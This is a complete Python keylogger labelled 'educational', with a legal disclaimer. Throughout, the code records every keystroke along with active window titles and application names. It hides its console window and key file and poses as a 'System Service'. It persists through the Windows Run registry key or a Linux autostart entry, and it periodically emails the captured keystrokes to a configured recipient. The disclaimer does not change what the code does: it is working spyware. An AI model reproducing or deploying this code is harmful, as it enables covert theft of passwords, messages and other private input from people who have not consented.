#!/usr/bin/env python3
"""
Educational Keylogger - For Learning and Testing Purposes Only

⚠️  LEGAL DISCLAIMER ⚠️
This keylogger is created for educational purposes and ethical testing only.
- Only use on systems you own or have explicit permission to test
- Using this on others' systems without consent is illegal
- The author is not responsible for misuse of this code

Features:
- Keystroke logging with timestamp
- Special key handling (Space, Enter, Backspace, etc.)
- Stealth mode operation
- Log file encryption
- Email reporting capability
- Persistence mechanism
"""

import os
import sys
import time
import logging
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener
import json
import base64
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
import subprocess
import platform
try:
    import psutil
except ImportError:
    psutil = None

class StealthKeylogger:
    def __init__(self, config_file="config/config.json"):
        """Initialize the keylogger with configuration"""
        self.config_file = config_file
        self.load_config()
        
        # Initialize logging
        self.setup_logging()
        
        # Initialize encryption
        self.setup_encryption()
        
        # Buffer for keystrokes
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Window tracking
        self.current_window = ""
        self.current_app = ""
        self.last_window_check = 0
        
        # Running flag
        self.running = True
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger initialized")
    
    def load_config(self):
        """Load configuration from file"""
        default_config = {
            "log_file": "logs/keylog.txt",
            "encrypted_log_file": "logs/keylog.enc",
            "email": {
                "enabled": False,
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "sender_email": "",
                "sender_password": "",
                "recipient_email": "",
                "send_interval_hours": 24
            },
            "stealth": {
                "hide_console": True,
                "process_name": "System Service",
                "startup_enabled": False
            },
            "logging": {
                "buffer_size": 100,
                "flush_interval_minutes": 5,
                "log_special_keys": True,
                "log_timestamps": True
            },
            "keylogger": {
                "capture_window_titles": True,
                "capture_application_names": True
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    loaded_config = json.load(f)
                    # Merge with defaults
                    self.config = {**default_config, **loaded_config}
            except Exception as e:
                print(f"Error loading config: {e}")
                self.config = default_config
        else:
            self.config = default_config
            self.save_config()
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def setup_logging(self):
        """Setup logging system"""
        # Ensure logs directory exists
        os.makedirs('logs', exist_ok=True)
        
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            filename='logs/keylogger_system.log',
            level=logging.INFO,
            format=log_format,
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger(__name__)
    
    def setup_encryption(self):
        """Setup encryption for log files"""
        # Ensure logs directory exists
        os.makedirs('logs', exist_ok=True)
        key_file = "logs/encryption.key"
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.encryption_key = f.read()
        else:
            # Generate new encryption key
            self.encryption_key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.encryption_key)
            
            # Hide the key file on Windows
            if platform.system() == "Windows":
                try:
                    subprocess.run(['attrib', '+H', key_file], check=True)
                except:
                    pass
        
        self.cipher_suite = Fernet(self.encryption_key)
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.encrypt(data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.decrypt(encrypted_data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Decryption error: {e}")
            return encrypted_data
    
    def get_active_window_info(self):
        """Get active window title and application name"""
        try:
            system = platform.system()
            
            if system == "Linux":
                # Try multiple methods for Linux
                try:
                    # Method 1: xdotool (most reliable)
                    window_id = subprocess.check_output(['xdotool', 'getactivewindow'], 
                                                      stderr=subprocess.DEVNULL).decode().strip()
                    window_title = subprocess.check_output(['xdotool', 'getwindowname', window_id], 
                                                         stderr=subprocess.DEVNULL).decode().strip()
                    
                    # Get process info
                    pid = subprocess.check_output(['xdotool', 'getwindowpid', window_id], 
                                                stderr=subprocess.DEVNULL).decode().strip()
                    
                    if psutil and pid.isdigit():
                        process = psutil.Process(int(pid))
                        app_name = process.name()
                    else:
                        app_name = "Unknown"
                    
                    return window_title, app_name
                    
                except (subprocess.CalledProcessError, FileNotFoundError):
                    # Method 2: wmctrl as fallback
                    try:
                        output = subprocess.check_output(['wmctrl', '-l'], 
                                                       stderr=subprocess.DEVNULL).decode()
                        active_output = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
                                                              stderr=subprocess.DEVNULL).decode()
                        window_id = active_output.split()[-1]
                        
                        for line in output.split('\n'):
                            if window_id.lower() in line.lower():
                                parts = line.split(None, 3)
                                if len(parts) >= 4:
                                    return parts[3], "Application"
                        return "Unknown Window", "Unknown App"
                        
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        # Method 3: Simple ps fallback
                        try:
                            output = subprocess.check_output(['ps', 'aux'], 
                                                           stderr=subprocess.DEVNULL).decode()
                            # Look for common GUI applications
                            gui_apps = ['firefox', 'chrome', 'code', 'terminal', 'gedit', 'nautilus']
                            for line in output.split('\n'):
                                for app in gui_apps:
                                    if app in line.lower() and 'grep' not in line:
                                        return f"{app.title()} Window", app
                            return "Terminal", "terminal"
                        except:
                            return "Unknown", "Unknown"
            
            elif system == "Windows":
                try:
                    import win32gui
                    import win32process
                    
                    hwnd = win32gui.GetForegroundWindow()
                    window_title = win32gui.GetWindowText(hwnd)
                    
                    # Get process name
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    if psutil:
                        process = psutil.Process(pid)
                        app_name = process.name()
                    else:
                        app_name = "Unknown"
                    
                    return window_title, app_name
                except ImportError:
                    return "Windows System", "Windows"
            
            elif system == "Darwin":  # macOS
                try:
                    script = '''
                    tell application "System Events"
                        set frontApp to name of first application process whose frontmost is true
                        set frontAppTitle to ""
                        try
                            tell process frontApp
                                set frontAppTitle to title of front window
                            end tell
                        end try
                        return frontApp & "|" & frontAppTitle
                    end tell
                    '''
                    
                    result = subprocess.check_output(['osascript', '-e', script], 
                                                   stderr=subprocess.DEVNULL).decode().strip()
                    parts = result.split('|', 1)
                    app_name = parts[0] if parts else "Unknown"
                    window_title = parts[1] if len(parts) > 1 else "Unknown Window"
                    
                    return window_title, app_name
                except:
                    return "macOS System", "macOS"
            
            else:
                return "Unknown System", "Unknown"
                
        except Exception as e:
            self.logger.error(f"Error getting window info: {e}")
            return "Error", "Error"
    
    def update_window_context(self):
        """Update current window context if enabled"""
        if not (self.config.get('keylogger', {}).get('capture_window_titles', False) or 
                self.config.get('keylogger', {}).get('capture_application_names', False)):
            return
        
        current_time = time.time()
        # Only check window every 2 seconds to reduce overhead
        if current_time - self.last_window_check < 2:
            return
        
        self.last_window_check = current_time
        
        try:
            window_title, app_name = self.get_active_window_info()
            
            # Create context string
            new_context = ""
            if self.config.get('keylogger', {}).get('capture_window_titles', False):
                new_context += window_title
            if self.config.get('keylogger', {}).get('capture_application_names', False):
                if new_context:
                    new_context += f" - {app_name}"
                else:
                    new_context = app_name
            
            # If context changed, log it
            if new_context and new_context != self.current_window:
                self.current_window = new_context
                self.current_app = app_name
                
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                context_log = f"[{timestamp}] === Application: {new_context} ===\n"
                
                with self.buffer_lock:
                    self.keystroke_buffer.append(context_log)
                    
        except Exception as e:
            self.logger.error(f"Error updating window context: {e}")
    
    def format_keystroke(self, key):
        """Format keystroke for logging"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
        
        try:
            # Handle special keys
            if key == Key.space:
                return f"[{timestamp}] [SPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else " "
            elif key == Key.enter:
                return f"[{timestamp}] [ENTER]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\n"
            elif key == Key.backspace:
                return f"[{timestamp}] [BACKSPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "[BS]"
            elif key == Key.tab:
                return f"[{timestamp}] [TAB]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\t"
            elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
                return f"[{timestamp}] [SHIFT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                return f"[{timestamp}] [CTRL]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
            elif key == Key.alt_l or key == Key.alt_r:
                return f"[{timestamp}] [ALT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
            elif hasattr(key, 'char') and key.char is not None:
                # Regular character
                prefix = f"[{timestamp}] " if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
                return f"{prefix}{key.char}"
            else:
                # Other special keys
                key_name = str(key).replace('Key.', '').upper()
                return f"[{timestamp}] [{key_name}]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else f"[{key_name}]"
                
        except Exception as e:
            self.logger.error(f"Error formatting keystroke: {e}")
            return f"[{timestamp}] [ERROR]\n"
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Update window context before logging keystroke
            self.update_window_context()
            
            formatted_key = self.format_keystroke(key)
            
            with self.buffer_lock:
                self.keystroke_buffer.append(formatted_key)
                
                # Flush buffer if it reaches the configured size
                if len(self.keystroke_buffer) >= self.config.get('keylogger', {}).get('buffer_size', 100):
                    self.flush_buffer()
                    
        except Exception as e:
            self.logger.error(f"Error in key press handler: {e}")
    
    def flush_buffer(self):
        """Flush keystroke buffer to file"""
        if not self.keystroke_buffer:
            self.logger.info("Buffer flush called but no keystrokes in buffer")
            return
        
        try:
            # Store count before clearing buffer
            keystroke_count = len(self.keystroke_buffer)
            
            # Write to plain text log
            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.writelines(self.keystroke_buffer)
            
            # Write to encrypted log
            encrypted_content = self.encrypt_data(''.join(self.keystroke_buffer))
            with open(self.config['encrypted_log_file'], 'a', encoding='utf-8') as f:
                f.write(encrypted_content + '\n')
            
            # Clear buffer
            self.keystroke_buffer.clear()
            
            self.logger.info(f"Buffer flushed - {keystroke_count} keystrokes logged")
            
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}")
    
    def format_log_for_email(self, log_content):
        """Format log content for better readability in emails"""
        if not log_content.strip():
            return "No keystrokes captured."
        
        import re
        from datetime import datetime, timedelta
        
        # Split content into lines for better processing
        lines = log_content.split('\n')
        formatted_lines = []
        current_keystroke_line = ""
        current_time = ""
        last_timestamp = None
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Check if this is an application context line
            if '=== Application:' in line:
                # Finish any current keystroke line before adding app context
                if current_keystroke_line.strip():
                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
                    current_keystroke_line = ""
                
                # Extract timestamp and app info
                timestamp_match = re.search(r'\[([^\]]+)\]', line)
                app_match = re.search(r'=== Application: ([^=]+) ===', line)
                
                if timestamp_match and app_match:
                    timestamp = timestamp_match.group(1)
                    app_info = app_match.group(1).strip()
                    formatted_lines.append("")  # Add spacing
                    formatted_lines.append(f"🔄 [{timestamp}] Application: {app_info}")
                    formatted_lines.append("─" * 50)
                    current_time = timestamp.split(' ')[1] if ' ' in timestamp else timestamp
                continue
            
            # Parse regular keystroke entries
            pattern = r'\[([^\]]+)\]\s*([^\[]*|\[[^\]]+\])'
            matches = re.findall(pattern, line)
            
            for timestamp, key_content in matches:
                # Parse timestamp
                try:
                    current_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                    time_only = timestamp.split(' ')[1]
                except:
                    time_only = timestamp
                    current_dt = None
                
                # Clean up key content
                key = key_content.strip()
                
                # Check if there's a significant time gap (more than 10 seconds)
                show_timestamp = False
                if last_timestamp is None:
                    show_timestamp = True
                    current_time = time_only
                elif current_dt and last_timestamp:
                    time_gap = (current_dt - last_timestamp).total_seconds()
                    if time_gap > 10:  # 10 seconds gap
                        show_timestamp = True
                
                # If showing timestamp, finish current line and start new one
                if show_timestamp and current_keystroke_line.strip():
                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
                    current_keystroke_line = ""
                    current_time = time_only
                elif not current_time:
                    current_time = time_only
                
                # Handle different key types
                if key == '[SPACE]':
                    current_keystroke_line += " "
                elif key == '[ENTER]':
                    if current_keystroke_line.strip():
                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
                    formatted_lines.append("--- <ENTER> ---")
                    current_keystroke_line = ""
                    current_time = ""
                elif key == '[TAB]':
                    current_keystroke_line += " <TAB> "
                elif key == '[BACKSPACE]':
                    if current_keystroke_line and current_keystroke_line[-1] != ' ':
                        current_keystroke_line = current_keystroke_line[:-1]
                    else:
                        current_keystroke_line += " <BACKSPACE> "
                elif key in ['[CTRL]', '[ALT]', '[SHIFT]']:
                    current_keystroke_line += f" <{key[1:-1]}> "
                elif key.startswith('[') and key.endswith(']'):
                    # Other special keys
                    current_keystroke_line += f" <{key[1:-1]}> "
                elif key:
                    # Regular character
                    current_keystroke_line += key
                
                # Start new line after reasonable length
                if len(current_keystroke_line) > 100:
                    if current_keystroke_line.strip():
                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
                    current_keystroke_line = ""
                    current_time = ""
                
                # Update last timestamp for gap detection
                if current_dt:
                    last_timestamp = current_dt
        
        # Add any remaining content
        if current_keystroke_line.strip():
            formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
        
        return '\n'.join(formatted_lines) if formatted_lines else "No readable keystrokes found."
    
    def send_email_report(self):
        """Send email report with logs"""
        if not self.config['email']['enabled']:
            return
        
        try:
            # Read log file
            if not os.path.exists(self.config['log_file']):
                return
            
            with open(self.config['log_file'], 'r', encoding='utf-8') as f:
                log_content = f.read()
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = self.config['email']['sender_email']
            msg['To'] = self.config['email']['recipient_email']
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Format log content for better readability
            formatted_content = self.format_log_for_email(log_content[-3000:])  # Last 3000 chars for more context
            
            # Email body
            body = f"""
📊 Educational Keylogger Report
===============================
📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🖥️  System: {platform.system()} {platform.release()}

📝 Captured Keystrokes
----------------------
{formatted_content}

ℹ️  Notes:
• Timestamps shown only when there are time gaps (>10 seconds)
• Special keys shown in <brackets>: <ENTER>, <TAB>, <CTRL>, etc.
• Lines grouped for better readability

🔒 This is an educational demonstration of keystroke monitoring.
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP(self.config['email']['smtp_server'], self.config['email']['smtp_port'])
            server.starttls()
            server.login(self.config['email']['sender_email'], self.config['email']['sender_password'])
            text = msg.as_string()
            server.sendmail(self.config['email']['sender_email'], self.config['email']['recipient_email'], text)
            server.quit()
            
            self.logger.info("Email report sent successfully")
            
            # Clear log file after sending
            open(self.config['log_file'], 'w').close()
            
        except Exception as e:
            self.logger.error(f"Error sending email report: {e}")
    
    def setup_stealth_mode(self):
        """Setup stealth mode features"""
        if not self.config['stealth']['hide_console']:
            return
        
        try:
            if platform.system() == "Windows":
                import ctypes
                # Hide console window
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception as e:
            self.logger.error(f"Error setting up stealth mode: {e}")
    
    def setup_persistence(self):
        """Setup startup persistence"""
        if not self.config['persistence']['startup_enabled']:
            return
        
        try:
            if platform.system() == "Windows":
                # Add to Windows startup registry
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
            elif platform.system() == "Linux":
                # Add to Linux autostart
                autostart_dir = os.path.expanduser("~/.config/autostart/")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Service
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(os.path.join(autostart_dir, "system-service.desktop"), 'w') as f:
                    f.write(desktop_entry)
            
            self.logger.info("Persistence setup completed")
        except Exception as e:
            self.logger.error(f"Error setting up persistence: {e}")
    
    def schedule_tasks(self):
        """Schedule recurring tasks"""
        # Schedule buffer flushing
        schedule.every(self.config.get('keylogger', {}).get('flush_interval_minutes', 5)).minutes.do(self.flush_buffer)
        
        # Schedule email reports
        if self.config['email']['enabled']:
            schedule.every(self.config['email']['send_interval_hours']).hours.do(self.send_email_report)
    
    def run_scheduler(self):
        """Run scheduled tasks in background thread"""
        while self.running:
            schedule.run_pending()
            time.sleep(30)  # Check every 30 seconds
    
    def start(self):
        """Start the keylogger"""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting keylogger...")
        
        # Setup stealth mode
        self.setup_stealth_mode()
        
        # Setup persistence
        self.setup_persistence()
        
        # Schedule tasks
        self.schedule_tasks()
        
        # Start scheduler thread
        scheduler_thread = threading.Thread(target=self.run_scheduler, daemon=True)
        scheduler_thread.start()
        
        # Log startup
        self.logger.info("Keylogger started successfully")
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger is running...")
        print("Press Ctrl+C to stop the keylogger")
        
        try:
            # Start listening for keystrokes
            with Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped by user")
            self.stop()
        except Exception as e:
            self.logger.error(f"Error in keylogger: {e}")
            print(f"Error: {e}")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        
        # Flush any remaining buffer
        with self.buffer_lock:
            self.flush_buffer()
        
        # Send final email report if email is enabled
        if self.config['email']['enabled']:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sending final email report...")
            self.send_email_report()
        
        self.logger.info("Keylogger stopped")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped")


def main():
    """Main function"""
    print("=" * 60)
    print("Educational Keylogger v1.0")
    print("For Educational and Testing Purposes Only")
    print("=" * 60)
    
    # Create keylogger instance
    keylogger = StealthKeylogger()
    
    # Start keylogger
    keylogger.start()


if __name__ == "__main__":
    main()